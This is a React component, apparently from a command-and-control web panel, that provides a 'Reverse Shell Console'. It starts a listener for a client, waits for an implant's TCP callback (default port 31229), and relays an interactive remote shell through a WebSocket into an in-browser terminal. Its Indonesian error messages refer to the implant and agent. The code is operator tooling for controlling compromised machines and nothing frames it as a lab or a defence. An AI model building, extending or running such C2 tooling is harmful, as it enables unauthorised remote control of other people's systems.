import { useState, useEffect, useRef } from "react";
import { Terminal } from "@xterm/xterm";
import "@xterm/xterm/css/xterm.css";
import { clientService } from "@/services/clientService";

type ShellStatus = "idle" | "connecting" | "connected";

function TerminalLoading() {
  const [dots, setDots] = useState("");

  useEffect(() => {
    const interval = setInterval(() => {
      setDots((prev) => (prev.length >= 3 ? "" : prev + "."));
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <p className="text-yellow-500 font-mono">
      Establishing connection{dots}
    </p>
  );
}

type ReverseShellTabProps = {
  clientId?: string;
};

export default function ReverseShellTab({ clientId }: ReverseShellTabProps) {
  const [status, setStatus] = useState<ShellStatus>("idle");
  const [shellPort, setShellPort] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);
  const terminalRef = useRef<HTMLDivElement>(null);

  const checkActiveShells = async () => {
    if (!clientId) return;
    try {
      const activeShells = await clientService.getReverseShells();
      const isActive = (activeShells.connections || []).includes(clientId);

      if (isActive) {
        setStatus("connected");
        setError(null);
      } else if (status === "connected") {
        setStatus("idle");
        setShellPort(null);
      }
    } catch (err) {
      console.error("Error checking active shells:", err);
    }
  };

  useEffect(() => {
    checkActiveShells();
    const interval = setInterval(checkActiveShells, 5000);
    return () => clearInterval(interval);
  }, [clientId, status]);

  useEffect(() => {
    if (status !== "connecting") return;
    const timeout = setTimeout(() => {
      setStatus("idle");
      setShellPort(null);
      setError(
        "Connection timeout (30s). Implant tidak melakukan TCP callback ke " +
          (shellPort ? `port ${shellPort}` : "listener") +
          ". Pastikan agent aktif dan dapat menjangkau server."
      );
    }, 30_000);
    return () => clearTimeout(timeout);
  }, [status, shellPort]);

  const handleActivate = async () => {
    if (!clientId) return;
    setStatus("connecting");
    setError(null);

    try {
      const res = await clientService.startReverseShell(clientId);
      if (res.success) {
        setShellPort(res.port);
      } else {
        setError(res.message || "Failed to start listener.");
        setStatus("idle");
      }
    } catch (err: any) {
      setError(err.message || "Failed to start reverse shell.");
      setStatus("idle");
    }
  };

  const handleTerminate = async () => {
    if (!clientId) return;
    setError(null);
    try {
      await clientService.closeReverseShell(clientId);
      setStatus("idle");
      setShellPort(null);
    } catch (err: any) {
      setError(err.message || "Failed to close reverse shell.");
      setStatus("idle");
      setShellPort(null);
    }
  };

  useEffect(() => {
    if (status !== "connected" || !clientId || !terminalRef.current) return;

    const term = new Terminal({
      cursorBlink: true,
      theme: {
        background: "#0a0f0a",
        foreground: "#00FF41",
        cursor: "#00FF41",
        selectionBackground: "rgba(0, 255, 65, 0.3)",
      },
      fontFamily: "Courier New, Courier, monospace",
      fontSize: 14,
      rows: 15,
    });

    term.open(terminalRef.current);
    term.write("\r\n*** DCC SECURE REVERSE SHELL ESTABLISHED ***\r\n\r\n");

    const wsProtocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${wsProtocol}//${window.location.host}/ws/shell/${clientId}`;
    const ws = new WebSocket(wsUrl);

    ws.onmessage = (event) => {
      term.write(event.data);
    };

    ws.onclose = () => {
      term.write("\r\n*** CONNECTION TERMINATED BY C2 SERVER ***\r\n");
    };

    ws.onerror = () => {
      term.write("\r\n*** WEB_SOCKET CHANNEL TELEMETRY ERROR ***\r\n");
    };

    term.onData((data) => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(data);
      }
    });

    return () => {
      term.dispose();
      ws.close();
    };
  }, [status, clientId]);

  const connectionLabel =
    status === "idle"
      ? "Waiting to receive..."
      : status === "connecting"
        ? `Menunggu implant callback ke port ${shellPort ?? "31229"}...`
        : "Connected";

  const connectionDotColor =
    status === "connected" ? "bg-green" : status === "connecting" ? "bg-yellow-500" : "bg-red-500";

  const sessionIdValue =
    status === "idle"
      ? "N/A"
      : status === "connecting"
        ? "Waiting for connection"
        : clientId || "Active";

  return (
    <div className="flex flex-col gap-4 sm:gap-6 font-mono">
      <div className="border border-green/40 rounded-lg p-4 sm:p-6 bg-black/40">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 sm:gap-0 mb-6">
          <h2 className="text-lg sm:text-xl font-semibold text-white">Reverse Shell Console</h2>
          {error && (
            <span className="text-red-500 text-xs mr-2">[ERROR]: {error}</span>
          )}
          {status === "idle" ? (
            <button
              onClick={handleActivate}
              disabled={!clientId}
              className="w-full sm:w-auto border border-green/50 rounded px-4 py-2 text-green text-sm font-semibold hover:bg-green/10 disabled:opacity-50 disabled:cursor-not-allowed transition-colors cursor-pointer"
            >
              Activate Reverse Shell
            </button>
          ) : (
            <button
              onClick={handleTerminate}
              disabled={!clientId}
              className="w-full sm:w-auto border border-red-500/50 rounded px-4 py-2 text-red-500 text-sm font-semibold hover:bg-red-500/10 disabled:opacity-50 disabled:cursor-not-allowed transition-colors cursor-pointer"
            >
              Terminate Shell
            </button>
          )}
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          <div className="border border-green/30 rounded-lg p-4 bg-[#0a0f0a]">
            <div className="flex items-center gap-2 text-gray-400 text-xs mb-2">
              <span className="text-green">⚡</span> Connection Status
            </div>
            <div className="flex items-center gap-2">
              <span className={`w-2.5 h-2.5 rounded-full ${connectionDotColor}`} />
              <span className="text-white text-sm">{connectionLabel}</span>
            </div>
          </div>

          <div className="border border-green/30 rounded-lg p-4 bg-[#0a0f0a]">
            <div className="flex items-center gap-2 text-gray-400 text-xs mb-2">
              <span className="text-red-500">■</span> Session ID
            </div>
            <p className="text-white text-sm truncate" title={sessionIdValue}>
              {sessionIdValue}
            </p>
          </div>

          <div className="border border-green/30 rounded-lg p-4 bg-[#0a0f0a]">
            <div className="flex items-center gap-2 text-gray-400 text-xs mb-2">
              <span className="text-green">⚡</span> Listening Port
            </div>
            <p className="text-white text-sm">{shellPort || "31229"}</p>
          </div>
        </div>

        <div className="border border-green/30 rounded-lg overflow-hidden bg-[#0a0f0a]">
          <div className="flex items-center justify-between px-4 py-2.5 border-b border-green/20 bg-[#111811]">
            <div className="flex items-center gap-2">
              <span className="w-3 h-3 rounded-full bg-red-500" />
              <span className="w-3 h-3 rounded-full bg-yellow-500" />
              <span className="w-3 h-3 rounded-full bg-green" />
              <span className="text-gray-400 text-sm ml-2">Terminal</span>
            </div>
            <span
              className={`text-sm font-medium ${
                status === "connected"
                  ? "text-green"
                  : status === "connecting"
                    ? "text-yellow-500"
                    : "text-red-500"
              }`}
            >
              {status === "connected"
                ? "● Connected"
                : status === "connecting"
                  ? "● Connecting..."
                  : "● Not connected"}
            </span>
          </div>

          <div className="p-4 bg-[#0a0f0a]">
            {status === "connected" ? (
              <div ref={terminalRef} className="w-full h-auto min-h-[240px] text-green" />
            ) : status === "connecting" ? (
              <div className="min-h-[240px] flex items-center justify-center">
                <TerminalLoading />
              </div>
            ) : (
              <div className="min-h-[240px] flex items-center justify-center">
                <p className="text-gray-600 italic">Waiting for connection...</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
